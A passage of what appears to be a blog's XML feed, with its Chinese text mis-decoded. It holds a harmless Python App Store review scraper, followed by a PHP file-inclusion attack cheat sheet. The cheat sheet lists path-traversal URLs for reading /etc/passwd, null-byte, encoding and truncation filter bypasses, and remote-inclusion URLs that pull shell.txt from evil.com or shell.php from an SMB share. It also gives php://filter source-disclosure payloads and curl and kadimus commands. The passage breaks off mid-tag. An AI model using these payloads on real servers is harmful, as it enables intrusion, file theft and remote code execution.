å¯ä»¥çœ‹åˆ°æ˜¯å­—å…¸ç±»å‹ï¼Œé‚£ä¹ˆå– <code>key</code> ä¸º <code>trackId</code> å’Œ <code>trackName</code> å‡ºæ¥ã€‚</p><p>æ•ˆæœï¼š</p><p><img src="https://s1.ax1x.com/2020/03/20/86wZGT.png" alt="86wZGT.png"></p><p>å¦‚æœæœç´¢ä¸åˆ°çš„è¯å°±ç›´æ¥ç²¾ç¡®æœç´¢ï¼Œä¸»è¦é€»è¾‘ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">SearchAppId</span>(<span class="hljs-params">app</span>):<br>url = <span class="hljs-string">&quot;http://itunes.apple.com/search?term=&quot;</span> + app + <span class="hljs-string">&quot;&amp;entity=software&quot;</span><br>r = requests.get(url)<br>html = r.content<br>html_doc = <span class="hljs-built_in">str</span>(html, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>data = json.loads(html_doc)<br>resultCount = data[<span class="hljs-string">&#x27;resultCount&#x27;</span>]<br>results = data[<span class="hljs-string">&#x27;results&#x27;</span>]<br><span class="hljs-built_in">print</span>(app + <span class="hljs-string">&quot; Find &quot;</span> + <span class="hljs-built_in">str</span>(resultCount) + <span class="hljs-string">&quot; result(s)&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(resultCount):<br>name = results[i][<span class="hljs-string">&#x27;trackName&#x27;</span>]<br>app_id = results[i][<span class="hljs-string">&#x27;trackId&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nameï¼š&quot;</span> + name, <span class="hljs-string">&quot;idï¼š&quot;</span> + <span class="hljs-built_in">str</span>(app_id))<br></code></pre></td></tr></table></figure><h2 id="å»ºç«‹è¡¨æ ¼"><a href="#å»ºç«‹è¡¨æ ¼" class="headerlink" title="å»ºç«‹è¡¨æ ¼"></a>å»ºç«‹è¡¨æ ¼</h2><p>æˆ‘ä»¬å¾—ç”¨ <code>openpyxl</code> æ¨¡å—åˆå§‹åŒ–å¥½è¡¨æ ¼å†å¾€é‡Œå†™æ•°æ®ï¼Œåˆå§‹åŒ–ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Workbook init</span><br>wb = openpyxl.Workbook()<br>ws = wb.active<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">1</span>, value=<span class="hljs-string">&quot;æ˜µç§°&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">2</span>, value=<span class="hljs-string">&quot;è¯„åˆ†&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">3</span>, value=<span class="hljs-string">&quot;ç”¨æˆ·id&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">4</span>, value=<span class="hljs-string">&quot;è¯„è®º&quot;</span>)<br><span class="hljs-comment"># æˆ‘ä»¬è¿™é‡Œæå–æ˜µç§°ï¼Œè¯„åˆ†ï¼Œç”¨æˆ·idå’Œè¯„è®º</span><br></code></pre></td></tr></table></figure><h2 id="è·å–-App-è¯„è®º"><a href="#è·å–-App-è¯„è®º" class="headerlink" title="è·å– App è¯„è®º"></a>è·å– App è¯„è®º</h2><p>æˆ‘ä»¬åŒæ ·åœ¨æ¥å£æ‹¿åˆ°æ•°æ®åç¾åŒ–ä¸€ä¸‹æ ¼å¼ï¼Œåˆ†æä¸€ä¸‹æ•°æ®çš„ç»“æ„ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/20/86wAI0.png" alt="86wAI0.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨å­—å…¸çš„ <code>feed</code> é‡Œçš„ <code>entry</code>ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ª <code>list</code>ï¼Œé‡Œé¢å°±æ˜¯æ¯ä¸ªäººçš„ä¿¡æ¯äº†ã€‚</p><p>ç»§ç»­åˆ†æï¼Œæˆ‘ä»¬çœ‹åˆ°éœ€è¦æå–çš„æ•°æ®ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/20/86weRU.png" alt="86weRU.png"></p><ul><li>æ˜µç§°åœ¨ <code>author</code> ä¸­ <code>name</code> çš„ <code>label</code> ä¸­</li><li>è¯„åˆ†åœ¨ <code>im:rating</code> çš„ <code>label</code> ä¸­</li><li>id åœ¨ <code>id</code> çš„ <code>label</code> ä¸­</li><li>è¯„è®ºåœ¨ <code>content</code>  çš„ <code>label</code> ä¸­</li></ul><p>äºæ˜¯å°±å¯ä»¥å¤„ç†å¹¶å†™å…¥è¡¨æ ¼äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">SaveContent</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, wb, ws</span>):<br>row = <span class="hljs-number">2</span> <span class="hljs-comment"># è¡¨æ ¼çš„rowï¼Œç®€å•ç²—æš´</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>): <span class="hljs-comment"># åªèƒ½çˆ¬å–å‰åé¡µ</span><br>url = <span class="hljs-string">&quot;https://itunes.apple.com/rss/customerreviews/page=&quot;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&quot;/id=&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>) + <span class="hljs-string">&quot;/sortby=mostrecent/json?l=en&amp;&amp;cc=cn&quot;</span><br>r = requests.get(url)<br><br><span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>: <span class="hljs-comment"># æ¯ä¸ªappè¯„è®ºæ•°ä¸ä¸€æ ·ï¼Œå¦‚æœæ²¡æœ‰æ•°æ®å°±ç›´æ¥returnäº†</span><br>html = r.content<br>html_doc = <span class="hljs-built_in">str</span>(html, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>data = json.loads(html_doc)[<span class="hljs-string">&quot;feed&quot;</span>][<span class="hljs-string">&quot;entry&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>name = i[<span class="hljs-string">&#x27;author&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>rate = i[<span class="hljs-string">&#x27;im:rating&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>user_id = i[<span class="hljs-string">&#x27;id&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>content = i[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>                <span class="hljs-comment"># å†™å…¥æ•°æ®</span><br>ws.cell(row=row, column=<span class="hljs-number">1</span>, value=name)<br>ws.cell(row=row, column=<span class="hljs-number">2</span>, value=rate)<br>ws.cell(row=row, column=<span class="hljs-number">3</span>, value=user_id)<br>ws.cell(row=row, column=<span class="hljs-number">4</span>, value=content)<br>row = row + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(name, rate, user_id, content)<br>                <span class="hljs-comment"># å¯æ‰“å°å¯ä¸æ‰“å°ï¼Œæ‰“å°è¿˜æ˜¯ä¼šå½±å“ä¸€ä¸‹é€Ÿåº¦çš„</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span><br><span class="hljs-comment"># æ¯ä¸€é¡µçˆ¬å–å»¶è¿Ÿ2ç§’ï¼Œä»¥é˜²è¿‡äºé¢‘ç¹</span><br>time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><h1 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h1><p>å°è£…ä¸€ä¸‹ï¼Œåœ¨ main è°ƒç”¨å‡½æ•°ï¼Œä¼ ä¸ªå‚è¿›å»ï¼Œæœ€åå†ä¿å­˜ä¸€ä¸‹ <code>xlsx</code> æ–‡ä»¶å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-comment">#!/usr/bin/env</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> openpyxl<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SearchAppId</span>(<span class="hljs-params">app</span>):<br>url = <span class="hljs-string">&quot;http://itunes.apple.com/search?term=&quot;</span> + app + <span class="hljs-string">&quot;&amp;entity=software&quot;</span><br>r = requests.get(url)<br>html = r.content<br>html_doc = <span class="hljs-built_in">str</span>(html, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>data = json.loads(html_doc)<br>resultCount = data[<span class="hljs-string">&#x27;resultCount&#x27;</span>]<br>results = data[<span class="hljs-string">&#x27;results&#x27;</span>]<br><span class="hljs-built_in">print</span>(app + <span class="hljs-string">&quot; Find &quot;</span> + <span class="hljs-built_in">str</span>(resultCount) + <span class="hljs-string">&quot; result(s)&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(resultCount):<br>name = results[i][<span class="hljs-string">&#x27;trackName&#x27;</span>]<br>app_id = results[i][<span class="hljs-string">&#x27;trackId&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nameï¼š&quot;</span> + name, <span class="hljs-string">&quot;idï¼š&quot;</span> + <span class="hljs-built_in">str</span>(app_id))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SaveContent</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, wb, ws</span>):<br>row = <span class="hljs-number">2</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>): <span class="hljs-comment"># åªèƒ½çˆ¬å–å‰åé¡µ</span><br>url = <span class="hljs-string">&quot;https://itunes.apple.com/rss/customerreviews/page=&quot;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&quot;/id=&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>) + <span class="hljs-string">&quot;/sortby=mostrecent/json?l=en&amp;&amp;cc=cn&quot;</span><br>r = requests.get(url)<br><br><span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:<br>html = r.content<br>html_doc = <span class="hljs-built_in">str</span>(html, <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>data = json.loads(html_doc)[<span class="hljs-string">&quot;feed&quot;</span>][<span class="hljs-string">&quot;entry&quot;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>name = i[<span class="hljs-string">&#x27;author&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>rate = i[<span class="hljs-string">&#x27;im:rating&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>user_id = i[<span class="hljs-string">&#x27;id&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>content = i[<span class="hljs-string">&#x27;content&#x27;</span>][<span class="hljs-string">&#x27;label&#x27;</span>]<br>ws.cell(row=row, column=<span class="hljs-number">1</span>, value=name)<br>ws.cell(row=row, column=<span class="hljs-number">2</span>, value=rate)<br>ws.cell(row=row, column=<span class="hljs-number">3</span>, value=user_id)<br>ws.cell(row=row, column=<span class="hljs-number">4</span>, value=content)<br>row = row + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(name, rate, user_id, content)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span><br><span class="hljs-comment"># æ¯ä¸€é¡µçˆ¬å–å»¶è¿Ÿ2ç§’ï¼Œä»¥é˜²è¿‡äºé¢‘ç¹</span><br>time.sleep(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>app = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;app:\n&quot;</span>)<br>SearchAppId(app)<br><br><span class="hljs-comment"># Workbook init</span><br>wb = openpyxl.Workbook()<br>ws = wb.active<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">1</span>, value=<span class="hljs-string">&quot;æ˜µç§°&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">2</span>, value=<span class="hljs-string">&quot;è¯„åˆ†&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">3</span>, value=<span class="hljs-string">&quot;ç”¨æˆ·id&quot;</span>)<br>ws.cell(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">4</span>, value=<span class="hljs-string">&quot;è¯„è®º&quot;</span>)<br><br><span class="hljs-built_in">id</span> = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;input app&#x27;s id:\n&quot;</span>)<br>SaveContent(<span class="hljs-built_in">id</span>, wb, ws)<br><br>wb.save(app + <span class="hljs-string">&quot;.xlsx&quot;</span>) <span class="hljs-comment"># é»˜è®¤ä¿å­˜åœ¨å½“å‰ç›®å½•</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Done!&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><p>æ•ˆæœå›¾ï¼š</p><p>æœ idï¼š</p><p><img src="https://s1.ax1x.com/2020/03/20/86wuM4.png" alt="86wuM4.png"></p><p>çˆ¬å–è¯„è®ºå¹¶ä¿å­˜ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/20/86wML9.png" alt="86wML9.png"></p><p>Done!</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“å‰ç›®å½•ç”Ÿæˆäº†æ–‡ä»¶ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/20/86wlZR.png" alt="86wlZR.png"></p><p>æ•°æ®æ•ˆæœå›¾ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/20/86w1d1.png" alt="86w1d1.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web Crawler</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>File Inclusion(Base on PHP)</title>
    <link href="/2020/03/18/file_inclusion/"/>
    <url>/2020/03/18/file_inclusion/</url>
    
    <content type="html"><![CDATA[<h1 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h1><ul><li><a href="https://github.com/P0cL4bs/Kadimus">Kadimus - https://github.com/P0cL4bs/Kadimus</a></li><li><a href="https://github.com/D35m0nd142/LFISuite">LFISuite - https://github.com/D35m0nd142/LFISuite</a></li><li><a href="https://github.com/kurobeats/fimap">fimap - https://github.com/kurobeats/fimap</a></li></ul><p>ä»PHP5.2å¼€å§‹ï¼Œåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>allow_url_include</code>æ˜¯ç¦ç”¨çš„ã€‚</p><ul><li><p>allow_url_fopen é»˜è®¤ä¸º On</p><p><code>æ˜¯å¦å…è®¸å°†URLï¼ˆå¦‚httpï¼š//æˆ–ftpï¼š//ï¼‰ä½œä¸ºæ–‡ä»¶å¤„ç†ã€‚</code></p></li><li><p>allow_url_include é»˜è®¤ä¸º Off</p><p><code>æ˜¯å¦å…è®¸include/requireæ‰“å¼€URLï¼ˆå¦‚httpï¼š//æˆ–ftpï¼š//ï¼‰ä½œä¸ºæ–‡ä»¶å¤„ç†ã€‚</code></p></li></ul><p>ä½ å¯ä»¥é€šè¿‡php.iniå¯ç”¨allow_url_includeï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">/etc/php7/apache2/php.ini<br>allow_url_include = On<br></code></pre></td></tr></table></figure><p>å½“ <code>allow_url_include</code> ä¸º On ä¸” <code>allow_url_fopen</code> ä¸º On çš„æ—¶å€™ï¼š</p><ul><li>5.2ç‰ˆæœ¬çš„PHPï¼Œé»˜è®¤å¼€å¯äº†register_globalsï¼ŒåŒ…å«çš„æ˜¯ txt ç„¶è€Œè¢«è§£ææˆäº†PHPã€‚</li></ul><p>å½“ <code>allow_url_include</code> ä¸º On è€Œ <code>allow_url_fopen</code> ä¸º Off çš„æ—¶å€™ï¼š</p><ul><li>éœ€é€šè¿‡ <code>php://input</code> ä¼ªåè®®è¿›è¡ŒåŒ…å«ï¼Œåªæ˜¯éƒ½éœ€è¦ <code>allow_url_include</code> ä¸ºOn</li></ul><h1 id="Basic-LFI"><a href="#Basic-LFI" class="headerlink" title="Basic LFI"></a>Basic LFI</h1><p>LFI(Local File Inclusionï¼Œæœ¬åœ°æ–‡ä»¶åŒ…å«)</p><p>åˆ©ç”¨ç›®å½•ç©¿è¶Šè¯»å–æ–‡ä»¶ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">52</span>hertz.tech<span class="hljs-regexp">/index.php?page=../</span>..<span class="hljs-regexp">/../</span>etc/passwd<br></code></pre></td></tr></table></figure><h2 id="Null-Byte"><a href="#Null-Byte" class="headerlink" title="Null Byte"></a>Null Byte</h2><p>è¿™ç§æƒ…å†µæ˜¯æœåŠ¡ç«¯åœ¨æ–‡ä»¶åŒ…å«çš„æ—¶å€™æ·»åŠ äº†ä¸€ä¸ªå›ºå®šçš„æ–‡ä»¶åç¼€æ¯”å¦‚æ˜¯(.php)ï¼Œè¿™æ ·ä¼šå¯¼è‡´è¯·æ±‚&#x2F;etc&#x2F;passwdä¼šå˜æˆ&#x2F;etc&#x2F;passwd.phpï¼Œè¿™æ ·å°±æ‰¾ä¸åˆ°æ–‡ä»¶äº†ã€‚</p><p>åœ¨ PHP ç‰ˆæœ¬ä½äº 5.3.4 æˆ‘ä»¬å¯ä»¥ä½¿ç”¨00æˆªæ–­(ç©ºå­—èŠ‚æˆªæ–­)ï¼Œå› ä¸º%00åœ¨Cè¯­è¨€ä¸­ä»£è¡¨ç»“æŸï¼ŒPHPæ˜¯åŸºäºCè¯­è¨€çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=../../../etc/passwd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h2 id="Double-encoding"><a href="#Double-encoding" class="headerlink" title="Double encoding"></a>Double encoding</h2><p>äºŒæ¬¡ç¼–ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=%252e%252e%252fetc%252fpasswd<br>http://52hertz.tech/index.php?page=%252e%252e%252fetc%252fpasswd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h2 id="UTF-8-encoding"><a href="#UTF-8-encoding" class="headerlink" title="UTF-8 encoding"></a>UTF-8 encoding</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd<br>http://52hertz.tech/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h2 id="Path-and-dot-truncation"><a href="#Path-and-dot-truncation" class="headerlink" title="Path and dot truncation"></a>Path and dot truncation</h2><p>é•¿åº¦æˆªæ–­ï¼šå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä¸€ç›´é‡å¤ç›®å½•å­—ç¬¦ä¸² <code>./</code> ï¼Œè¶…è¿‡4096ä¸ªå­—èŠ‚çš„æ–‡ä»¶åå°†è¢«å‰ªåˆ‡æ‰(Windows ä¸‹æ˜¯256byte)ï¼Œå› æ­¤å¤šä½™çš„å­—ç¬¦å°†è¢«ä¸¢å¼ƒã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=../../../etc/passwd............[ADD MORE]<br>http://52hertz.tech/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]<br>http://52hertz.tech/index.php?page=../../../etc/passwd/./././././.[ADD MORE] <br>http://52hertz.tech/index.php?page=../../../[ADD MORE]../../../../etc/passwd<br></code></pre></td></tr></table></figure><h2 id="Filter-bypass-tricks"><a href="#Filter-bypass-tricks" class="headerlink" title="Filter bypass tricks"></a>Filter bypass tricks</h2><p>å½“ç„¶æœ‰æ—¶å€™å¯èƒ½è¿‡æ»¤æ‰ <code>./</code>ï¼Œæœ‰ä¸€äº› bypass çš„å°æŠ€å·§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=....//....//etc/passwd<br>http://52hertz.tech/index.php?page=..///////..////..//////etc/passwd<br>http://52hertz.tech/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd<br></code></pre></td></tr></table></figure><h1 id="Basic-RFI"><a href="#Basic-RFI" class="headerlink" title="Basic RFI"></a>Basic RFI</h1><p>LFI(Remote File Inclusionï¼Œè¿œç¨‹æ–‡ä»¶åŒ…å«)ï¼Œæ¼æ´æ¡ä»¶ï¼š<code>allow_url_include</code> ä¸º <code>On</code></p><p>Most of the filter bypasses from LFI section can be reused for RFI.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">52</span>hertz.tech<span class="hljs-regexp">/index.php?page=http:/</span><span class="hljs-regexp">/evil.com/</span>shell.txt<br></code></pre></td></tr></table></figure><h2 id="Null-byte"><a href="#Null-byte" class="headerlink" title="Null byte"></a>Null byte</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">52</span>hertz.tech<span class="hljs-regexp">/index.php?page=http:/</span><span class="hljs-regexp">/evil.com/</span>shell.txt%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure><h2 id="Double-encoding-1"><a href="#Double-encoding-1" class="headerlink" title="Double encoding"></a>Double encoding</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">52</span>hertz.tech/index.php?page=http:%<span class="hljs-number">252</span>f%<span class="hljs-number">252</span>fevil.com%<span class="hljs-number">252</span>fshell.txt<br></code></pre></td></tr></table></figure><h2 id="Bypass-allow-url-include"><a href="#Bypass-allow-url-include" class="headerlink" title="Bypass allow_url_include"></a>Bypass allow_url_include</h2><p>å½“ <code>allow_url_include</code> and <code>allow_url_fopen</code> éƒ½ä¸º <code>Off</code>ï¼Œå¯ä»¥åˆ©ç”¨SMBå…±äº«æ¥ç»•è¿‡ php è¿œç¨‹æ–‡ä»¶åŒ…å«çš„é™åˆ¶ã€‚</p><ol><li>æ–°å»ºä¸€ä¸ª share </li><li>åœ¨é‡Œé¢å†™å…¥ php  : <code>shell.php</code></li><li>ç„¶åè¿›è¡ŒåŒ…å« <code>http://52hertz.tech/index.php?page=\\6.6.6.6\share\shell.php</code></li></ol><p>freebuf ä¸Š <a href="https://www.freebuf.com/articles/web/203577.html">æœ‰ä¸€ç¯‡æ–‡ç« </a> è®²å¾—æ¯”è¾ƒè¯¦ç»†</p><h1 id="LFI-x2F-RFI-using-wrappers"><a href="#LFI-x2F-RFI-using-wrappers" class="headerlink" title="LFI &#x2F; RFI using wrappers"></a>LFI &#x2F; RFI using wrappers</h1><p>åˆ©ç”¨åŒ…è£…å™¨æ¥è¿›è¡Œ LFI&#x2F;RFI</p><h2 id="Wrapper-php-x2F-x2F-filter"><a href="#Wrapper-php-x2F-x2F-filter" class="headerlink" title="Wrapper php:&#x2F;&#x2F;filter"></a>Wrapper php:&#x2F;&#x2F;filter</h2><p>è¯¦ç»†æ–‡æ¡£ <a href="https://www.php.net/manual/en/wrappers.php.php">åœ¨è¿™</a></p><p>å¤§å°å†™ä¸æ•æ„Ÿï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/read=string.rot13/resource=index.php<br>http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/convert.iconv.utf-<span class="hljs-number">8.</span>utf-<span class="hljs-number">16</span>/resource=index.php<br>http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/convert.base64-encode/resource=index.php<br>http://52hertz.tech/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä¸å¤§å‹æ–‡ä»¶çš„å‹ç¼©åŒ…è£…å™¨é“¾æ¥åœ¨ä¸€èµ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">http://52hertz.tech/index.php?page=php://<span class="hljs-built_in">filter</span>/zlib.deflate/convert.base64-encode/resource=/etc/passwd<br></code></pre></td></tr></table></figure><p>NOTEï¼šWrappers å¯ä»¥ç”¨ <code>|</code> or <code>/</code> è¿›è¡Œå¤šæ¬¡é“¾æ¥:</p><ul><li>Multiple base64 decodes: <code>php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s</code></li><li>deflate then base64encode (useful for limited character exfil): <code>php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./kadimus -u &quot;http://52hertz.tech/index.php?page=vuln&quot; -S -f &quot;index.php%00&quot; -O index.php --parameter page <br>curl &quot;http://52hertz.tech/index.php?page=php://filter/convert.base64-encode/resource=index.php&quot; | base64 -d &gt; index.php<br></code></pre></td></tr></table></figure><h2 